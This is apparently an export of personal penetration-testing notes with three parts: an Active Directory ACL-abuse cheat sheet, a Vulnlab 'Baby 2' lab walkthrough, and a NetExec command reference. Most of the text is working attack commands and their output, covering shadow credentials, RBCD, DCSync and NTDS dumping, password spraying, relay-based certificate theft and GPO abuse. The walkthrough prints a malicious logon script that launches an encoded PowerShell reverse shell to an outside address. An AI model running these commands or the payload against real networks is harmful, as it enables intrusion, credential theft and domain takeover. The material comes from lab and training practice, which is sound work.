{"AD/ACL-Abuse":{"title":"ACL Abuse","links":[],"tags":[],"content":"\n\n\n\n\nGenericWrite\n\nUpdate object’s attributes\n\n\nTargeted Kerberoasting\npython targetedKerberoast.py -v -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt;\n\nthen crack the hash using hashcat/john\n\nhashcat -m 13100 -a 0 &lt;hash_file&gt; rockyou.txt --force\n\nDemo Time\nShadow Credentials Attack in Action\n\nthere are 2 ways to exploit Shadow Credentials Attack\n\n\nPywhisker\nCertipy\n\ngithub.com/ShutdownRepo/pywhisker.git\ngithub.com/dirkjanm/PKINITtools\nPywhisker\npywhisker -d &#039;certified.htb&#039; -u &#039;judith.mader&#039; -p &#039;judith09&#039; --target &#039;management_svc&#039; --action &#039;add&#039;\n\npython3.13 ./PKINITtools/gettgtpkinit.py --verbose -cert-pfx VXDScQU4.pfx -pfx-pass &#039;T5DKsQYXMBD1btXlkv2j&#039; -dc-ip 10.129.231.186 certified.htb/management_svc mgnt_svc.ccache\n\npython3.13 ./PKINITtools/getnthash.py -key b4218829273b99073fb46837df219b359ed34d0e6479d5208d1f0434f2d53bbf certified.htb/management_svc\n\n# NT hash of management_svc\n[*] Using TGT from cache\n[*] Requesting ticket to self with PAC\nRecovered NT Hash\na091c1832bcdd4677c28b5a6a1295584\nnow we learnt the Pywhisker way , now lets dive in the certipy way of doing ShadowCredentials Attack\nCertipy Way - Shadow Credentials Attack\ncertipy shadow auto -username judith.mader@certified.htb -p judith09 -account management_svc\n\n\nor using Kerberos\n\ncertipy shadow auto -username username@domain -p &lt;password&gt; -k -account &lt;target_username&gt; -target &lt;dc&gt;\nGenericALL\n\nFull rights to the object (add users to a group or reset user’s password)\n\nPassword Change\nnet rpc password &lt;username&gt; &lt;new_password&gt; -U &lt;domain&gt;/&lt;username&gt;%&lt;hash&gt; -S &lt;dc&gt; --pw-nt-hash\nAdd user to a group\nnet rpc group addmem &lt;target_group&gt; &lt;username&gt; -U &lt;domain&gt;/&lt;username&gt; -S &lt;dc&gt;\nRBCD\nrbcd.py -delegate-from &#039;&lt;machine_name&gt;&#039; -delegate-to &#039;&lt;target&gt;&#039; -dc-ip &lt;ip&gt; -action &#039;write&#039; &#039;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#039;\n \ngetST.py -spn &#039;cifs/&lt;dc&gt;&#039; -impersonate administrator -dc-ip &lt;ip&gt; &#039;&lt;domain&gt;/&lt;machine_name&gt;:&lt;password&gt;&#039;\n \nexport KRB5CCNAME=administrator.ccache\n \nsecretsdump.py -k\nForceChangePassword\n\nAbility to change user’s password\n\n# Method 1\nnet rpc password &lt;TargetUser&gt; &lt;new_password&gt; -U &quot;DOMAIN&quot;/&quot;ControlledUser&quot;%&quot;Password&quot; -S &lt;DomainController&gt;\n# Method 2\nbloodyAD --host &lt;ip&gt; -d &lt;dc&gt; -u &lt;username&gt; -p &lt;password&gt; set password &lt;target_userename&gt; &lt;new_password&gt;\n# Method 3\npython rpcchangepwd.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; -newpass &lt;new_password&gt;\nAddMember\nnet rpc group addmem &lt;target_group&gt; &lt;username&gt; -U &lt;domain&gt;/&lt;username&gt; -S &lt;dc&gt;\nWriteOwner\n\nChange object owner to attacker controlled user take over the object\n\n\nbloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan\n \nbloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan\n# or\ndacledit.py -action &#039;write&#039; -rights &#039;FullControl&#039; -principal &#039;ryan&#039; -target &#039;ca_svc&#039; &#039;sequel.htb&#039;/&#039;ryan&#039;:&#039;WqSZAF6CysDQbGb3&#039;\n \n# Optional\nbloodyAD.py -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; --host &lt;dc&gt; add groupMember &lt;target_group&gt; &lt;username&gt;\n# Must Do at end\ncertipy shadow auto -u ryan@sequel.htb -p &#039;WqSZAF6CysDQbGb3&#039; -dc-ip 10.129.89.239 -ns 10.129.89.239 -target dc01.sequel.htb -account ca_svc\nWriteDacl\n\n# Read Access\ndacledit.py -action &#039;read&#039; -principal joffrey.baratheon -target &#039;tyron.lannister&#039; &#039;sevenkingdoms.local&#039;/&#039;joffrey.baratheon&#039;:&#039;1killerlion&#039;\n# Full Control Access\ndacledit.py -action &#039;write&#039; -rights &#039;FullControl&#039; -principal joffrey.baratheon  -target &#039;tyron.lannister&#039; &#039;sevenkingdoms.local&#039;/&#039;joffrey.baratheon&#039;:&#039;1killerlion&#039;\n\n\nOk now we can :\n\nchange tyron password\ndo a target kerberoasting\ndo a shadow credentials\n\n\nLet’s just use shadowcredentials :\n\ncertipy shadow auto -u joffrey.baratheon@sevenkingdoms.local -p &#039;1killerlion&#039; -account &#039;tyron.lannister&#039;\n\nAddKeyCredentialLink\n# With username &amp; password\npython3 pywhisker.py -d &lt;domain&gt; --dc-ip &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --target &lt;target_username&gt; --action &quot;add&quot;\n# With Hashes\npython3 pywhisker.py -d &lt;domain&gt; --dc-ip &lt;ip&gt; -u &lt;username&gt; -H :&lt;hashes&gt; --target &lt;target_username&gt; --action &quot;add&quot;\ncertipy shadow auto -username &lt;username&gt;@&lt;domain&gt; -hashes :&lt;hashes&gt; -account &lt;target_username&gt;\nReadLAPSPassword\nnxc smb &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --laps\nReadGMSAPassword\nnxc ldap &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; --gmsa\nAllExtendedRights\n\nit is basically DCSync rights\n\n\nAdd DCSync Rights by using :\ndacledit.py megacorp.local/snovvcrash:&#039;Passw0rd!&#039; -action write -rights DCSync -principal snovvcrash -target-dn &#039;DC=megacorp,DC=local&#039; -dc-ip 192.168.1.11\nsecretsdump.py &lt;dc&gt; -k\nnxc smb &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds\nnxc smb &lt;domain&gt; -k --use-kcache --ntds\nResources\n\nwww.thehacker.recipes/ad/movement/dacl/\nppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse\nmayfly277.github.io/posts/GOADv2-pwning-part11/\nwww.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\n\nInteresting Tool for Enumeration of ACLs\ngithub.com/garrettfoster13/aced\nA Good talk on Finding AD Attack Paths using BOFHound\nwww.youtube.com/watch\nSlides:\ngithub.com/SpecterOps/presentations/blob/main/SO-CON 2024/Matt Creel %26 Adam Brown - Manually Enumerating AD Attack Paths with BOFHound/Matt Creel and Adam Brown - Manually Enumerating AD Attack Paths With BOFHound - SO-CON 2024.pdf\nAutomated ACL Exploitation Tool\ngithub.com/fox-it/aclpwn.py"},"Vulnlab/Baby-2":{"title":"Baby 2","links":[],"tags":[],"content":"\nTarget IP : 10.10.120.238\nLet’s generate the domain names into /etc/hosts file using nxc\n❯ sudo nxc smb 10.10.120.238 --generate-hosts-file /etc/hosts\n\nNMAP Scan Results\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain?\n| fingerprint-strings: \n|   DNSVersionBindReqTCP: \n|     version\n|_    bind\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.baby2.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.baby2.vl\n| Not valid before: 2023-08-22T17:39:15\n|_Not valid after:  2024-08-21T17:39:15\n|_ssl-date: 2024-06-27T14:19:20+00:00; 0s from scanner time.\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: BABY2\n|   NetBIOS_Domain_Name: BABY2\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: baby2.vl\n|   DNS_Computer_Name: dc.baby2.vl\n|   DNS_Tree_Name: baby2.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-06-27T14:18:40+00:00\n| ssl-cert: Subject: commonName=dc.baby2.vl\n| Not valid before: 2024-06-26T14:12:24\n|_Not valid after:  2024-12-26T14:12:24\n|_ssl-date: 2024-06-27T14:19:20+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         Microsoft Windows RPC\n61367/tcp open  msrpc         Microsoft Windows RPC\n61375/tcp open  msrpc         Microsoft Windows RPC\n61390/tcp open  msrpc         Microsoft Windows RPC\nEnumerate SMB Shares (Unauthenticated)\n❯ smbclient -L ////baby2.vl\n\nthere are 3 interesting shares\n\napps\ndocs\nhomes\n\nThe SMB Share homes allows Guest users to read and write\nso lets check homes share what’s inside it\n❯ smbclient --no-pass //baby2.vl/homes\n❯ smbclient --no-pass //baby2.vl/homes -c &quot;dir&quot; | awk &#039;{print $1}&#039; | grep -E &#039;^[A-Za-z]+\\.[A-Za-z]+$&#039;\n\n\nWe can use this list of users to create a username wordlist, and password spray each account by using the username as password:\n❯ nxc smb baby2.vl -u users.txt -p users.txt --continue-on-success\n\nwe have 2 valid hits!\nThis gave us access to the users: Carl.Moore, library\n\ninside SYSVOL there’s one folder called script which is having a login.vbs file which has write permission , means we can modify it\n\nThis login.vbs is a Domain Logon Script, and is normally created in Active Directory Environments to run scripts when a user logins, just as its name suggests.\nWe can exploit this by altering the contents of login.vbs to a VBS script that downloads and executes in memory a reverse PowerShell shell.\nMalicious login.vbs file i generated &amp; replaced it there in scripts folder in SYSVOL Share &amp; start a nc listener in background &amp; got a reverse shell as amelia.griffiths\nSet oShell = CreateObject(&quot;Wscript.Shell&quot;)\noShell.run &quot;powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADQALgAyADAANgAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&quot;\n\nPrivilege Escalation\nlet’s get the bloodhound data using the Carl.Moore creds which we got earlier &amp; we can mark amelia.griffiths as owned &amp; go from there in BloodHound (i’ll be using rusthound-ce as its faster than normal bloodhound collector)\n❯ rusthound-ce -d baby2.vl -u Carl.Moore@baby2.vl -z\n\n\nbut we have to keep one thing in mind that we have amelia.griffiths as reverse shell we dont have her password , so to exploit WriteDacl we cant use linux tools like impacket/BloodyAD !\nWe have to exploit from inside of the revshell itself , basically using ps1 files powershell way  , so let’s use powerview\nImport-Module .\\PowerView.ps1\nadd-domainobjectacl -rights &quot;all&quot; -targetidentity &quot;gpoadm&quot; -principalidentity &quot;Amelia.Griffiths&quot;\n$cred = ConvertTo-SecureString &#039;RajWasHere123!&#039; -AsPlainText -Force\nset-domainuserpassword gpoadm -accountpassword $cred\n\nnow this is done so use nxc to check if password has been changed for gpoadm user\n❯ nxc smb baby2.vl -u &#039;gpoadm&#039; -p &#039;RajWasHere123!&#039;\n\nso at this stage we have pwned user gpoadm now lets go back to bloodhound &amp; mark it as owned &amp; see from here where we move\n\nwe notice that the GPOADM user has GenericAll over the default domain controller’s policy.\nas bloodhound suggest we can use pyGPOAbuse to exploit it\nFirst, we need to find the GPO File Path ID in the policy\n\nWe can use pygpoabuse.py to add the gpoadm user into the administrator group.\n❯ python3 pygpoabuse.py &#039;baby2.vl/gpoadm:RajWasHere123!&#039; -gpo-id 6AC1786C-016F-11D2-945F-00C04fB984F9 -f -dc-ip 10.10.120.238 -command &#039;net localgroup administrators /add gpoadm&#039;\n\nBingo!! it means our gpoadm user is now part of administrator groups means we can do direct DCSync\nDCSync\n❯ nxc smb baby2.vl -u &#039;gpoadm&#039; -p &#039;RajWasHere123!&#039; --ntds\n\nnow we can use Administrator hash to spawn a evil-winrm shell\n❯ evil-winrm -i baby2.vl -u Administrator -H &#039;61eb5125f9944214679c2d0fdca6eb82&#039;\n"},"index":{"title":"index","links":[],"tags":[],"content":"NetExec\nNetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks\n\nNetExec can exploit multiple protocols like :\nprotocols:\n  available protocols\n \n  {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql}\n    smb                 own stuff using SMB\n    ssh                 own stuff using SSH\n    ldap                own stuff using LDAP\n    ftp                 own stuff using FTP\n    wmi                 own stuff using WMI\n    winrm               own stuff using WINRM\n    rdp                 own stuff using RDP\n    vnc                 own stuff using VNC\n    mssql               own stuff using MSSQL\nInstall\napt install pipx git\npipx ensurepath\npipx install git+github.com/Pennyw0rth/NetExec\nor use the static binaries from here\nRelease Binaries\n\nGenerate /etc/hosts file of a target IP\n❯ sudo nxc smb 10.129.61.82 --generate-hosts-file /etc/hosts\n\nFind Domain SID\n❯ nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid\nLDAP        DC1.scrm.local  389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)\nLDAPS       DC1.scrm.local  636    DC1.scrm.local   [+] scrm.local\\sqlsvc \nLDAPS       DC1.scrm.local  636    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200\nList DC IP\n\nldap —dc-list flag listing Domain Controllers and finds IP Addresses (If accessible)\n\n❯ nxc ldap 10.129.61.82 -u user -p pass --dc-list\nCheck LDAP Signing\n\nUsing the module ldap-checker you can verify if ldap require channel binding or not\n\n❯ nxc ldap 10.129.61.82 -u user -p pass -M ldap-checker\nCheck if target has AV on\n❯ nxc smb authority.htb -u svc_ldap -p &#039;lDaP_1n_th3_cle4r!&#039; -M enum_av\nEnable RDP\n\nCredentials Required\n\n❯ nxc smb 10.129.61.82 -u user -p pass -M rdp -o ACTION=enable\nTake Screenshot from RDP remotely\n❯ nxc rdp 10.129.61.82 -u user -p pass --screenshot --screentime &lt;second&gt;\n\nEnumerate smb\n❯ nxc smb cicada.htb -u a -p &#039;&#039; --shares\nEnumerate Users\n❯ nxc smb cicada.htb -u a -p &#039;&#039; --rid-brute\n❯ nxc smb cicada.htb -u a -p &#039;&#039; --users\nSearch files with read access in SMB\n❯ nxc smb cicada.htb -u a -p &#039;&#039; -M spider_plus\nPassword Spray\n❯ nxc smb cicada.htb -u users.txt -p &#039;Cicada$M6Corpb*@Lp#nZp!8&#039; --continue-on-success\nExecute command\n\nCredentials required\n\n❯ nxc winrm cicada.htb -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -X &#039;cat C:\\Users\\emily.oscars.CICADA\\desktop\\user.txt&#039;\nMachineQuoata (MAQ)\nnxc ldap freelancer.htb -u lorra199 -p &#039;PWN3D#l0rr@Armessa199&#039; -M maq\n\nADCS  - ESC8\n\nTerminal 1\n\n❯ ntmlrelayx.py -t http://10.10.10.192/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\nTerminal 2\n\n❯ nxc smb 10.10.10.192 -u user -p &#039;password&#039; -d sevenkingdoms.local -M coerce_plus -o M=petitpotam L=tunIP\n❯ nxc smb 10.10.10.192 --pfx-cert ./MEEREN.pfx -u &quot;mareen$&quot;\n❯ nxc smb 10.10.10.192 --pfx-cert ./MEEREN.pfx -u &quot;mareen$&quot; --ntds --user Administrator\n\nASREP-Roasting\n\nwithout password\n\n❯ nxc ldap 10.10.10.192 -u users.txt -p &#039;&#039; --asreproast output.txt\n\n\nwith password\n\n❯ nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost oscp.local\nKerberoasting\n❯ nxc ldap 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18 --kerberoasting output.txt\n\nTargeted Kerberoasting\n❯ targetedKerberoast.py -u &#039;A.Briggs&#039; -p &#039;P4ssw0rd1#123&#039; --request-user N.Thompson -d &#039;delegate.vl&#039;\n\nFind Misconfigured Delegation\n\nNetExec allows you to retrieve the list of all misconfigured delegations\n\n❯ nxc ldap 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! --find-delegation\n \nSMB    192.168.56.11   445   WINTERFELL   [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nLDAP   192.168.56.11   389   WINTERFELL   [+] north.sevenkingdoms.local\\eddard.stark:FightP3aceAndHonor! (Pwn3d!)\nLDAP   192.168.56.11   389   WINTERFELL   AccountName  AccountType DelegationType                     DelegationRightsTo\nLDAP   192.168.56.11   389   WINTERFELL   ------------ ----------- ---------------------------------- ----------------------------------------------------------------\nLDAP   192.168.56.11   389   WINTERFELL   sansa.stark  Person      Unconstrained                      N/A\nLDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Constrained w/ Protocol Transition CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local\nLDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Resource-Based Constrained         RBCD-COMPUTER$\nLDAP   192.168.56.11   389   WINTERFELL   CASTELBLACK$ Computer    Constrained                        HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local\nLDAP   192.168.56.11   389   WINTERFELL   пользователь Person      Resource-Based Constrained         WINTERFELL$\nUnconstrained Delegation\nNetExec allows you to retrieve the list of all computers and users with the flag TRUSTED_FOR_DELEGATION\n❯ nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation\n\nRead DACL Rights\nLDAP module that permits to read and export the DACLs of one or mulitple objects !\n\nRead all the ACEs of the Administrator\n\n❯ nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read\n \nSMB         lab-dc.lab.local 445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:lab.local) (signing:False) (SMBv1:False)\nLDAP        lab-dc.lab.local 389    LAB-DC           [+] lab.local\\\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Target principal found in LDAP (CN=Administrator,CN=Users,DC=lab,DC=local)\n[*]  ACE[0] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ReadProperty\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)\n[*]    Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)\n[*]    Trustee (SID)             : BUILTIN\\Pre-Windows 2000 Compatible Access (S-1-5-32-554)\n[*]  ACE[1] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ReadProperty\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)\n[*]    Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)\n[*]    Trustee (SID)             : BUILTIN\\Pre-Windows 2000 Compatible Access (S-1-5-32-554)\n[*]  ACE[2] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ReadProperty\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)\n[*]    Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)\n[*]    Trustee (SID)             : BUILTIN\\Pre-Windows 2000 Compatible Access (S-1-5-32-554)\n[SNIP]\n\nRead all the rights the BlWasp user has on the Administrator\n\n❯ nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=BlWasp\n \nSMB         lab-dc.lab.local 445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:lab.local) (signing:False) (SMBv1:False)\nLDAP        lab-dc.lab.local 389    LAB-DC           [+] lab.local\\\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Found principal SID to filter on: S-1-5-21-2570265163-3918697770-3667495639-1103\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Target principal found in LDAP (CN=Administrator,CN=Users,DC=lab,DC=local)\n[*]  ACE[10] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Force-Change-Password (00299570-246d-11d0-a768-00aa006e0529)\n[*]    Trustee (SID)             : blwasp (S-1-5-21-2570265163-3918697770-3667495639-1103)\n\nRead all the principals that have DCSync rights on the domain\n\n❯ nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET_DN=&quot;DC=lab,DC=LOCAL&quot; ACTION=read RIGHTS=DCSync\n \nSMB         lab-dc.lab.local 445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:lab.local) (signing:False) (SMBv1:False)\nLDAP        lab-dc.lab.local 389    LAB-DC           [+] lab.local\\\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Target principal found in LDAP (DC=lab,DC=local)\n[*]  ACE[13] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n[*]    Trustee (SID)             : Domain Controllers (S-1-5-21-2570265163-3918697770-3667495639-516)\n[*]  ACE[14] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n[*]    Trustee (SID)             : blwasp (S-1-5-21-2570265163-3918697770-3667495639-1103)\n[*]  ACE[27] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n[*]    Trustee (SID)             : Administrators (S-1-5-32-544)\nDump gMSA\nExtract gmsa credentials accounts\nUsing the protocol LDAP you can extract the password of a gMSA account if you have the right.\n\n❯ nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa\n\nBloodHound Ingestor\n❯ nxc ldap &lt;ip&gt; -u user -p pass --bloodhound -ns &lt;ns-ip&gt; --collection All\n\nCheck which groups our user belongs to using the groupmembership module for LDAP\n❯ nxc ldap 10.10.11.35 -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -M groupmembership -o USER=&quot;emily.oscars&quot;\n \nLDAP        10.10.11.35     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nLDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)\nGROUPMEM... 10.10.11.35     389    CICADA-DC        [+] User: emily.oscars is member of following groups:\nGROUPMEM... 10.10.11.35     389    CICADA-DC        Remote Management Users\nGROUPMEM... 10.10.11.35     389    CICADA-DC        Backup Operators\nGROUPMEM... 10.10.11.35     389    CICADA-DC        Domain Users\nIf your user is part of Group Backup Operators we can directly do DCSync using backup_operator module\n❯ nxc smb 10.10.11.35 -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -M backup_operator\n \nSMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Triggering RemoteRegistry to start through named pipe...\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SAM to \\\\10.10.11.35\\SYSVOL\\SAM\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SYSTEM to \\\\10.10.11.35\\SYSVOL\\SYSTEM\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SECURITY to \\\\10.10.11.35\\SYSVOL\\SECURITY\nSMB         10.10.11.35     445    CICADA-DC        [*] Copying &quot;SAM&quot; to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SAM&quot;\nSMB         10.10.11.35     445    CICADA-DC        [+] File &quot;SAM&quot; was downloaded to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SAM&quot;\nSMB         10.10.11.35     445    CICADA-DC        [*] Copying &quot;SECURITY&quot; to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SECURITY&quot;\nSMB         10.10.11.35     445    CICADA-DC        [+] File &quot;SECURITY&quot; was downloaded to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SECURITY&quot;\nSMB         10.10.11.35     445    CICADA-DC        [*] Copying &quot;SYSTEM&quot; to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SYSTEM&quot;\nSMB         10.10.11.35     445    CICADA-DC        [+] File &quot;SYSTEM&quot; was downloaded to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SYSTEM&quot;\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        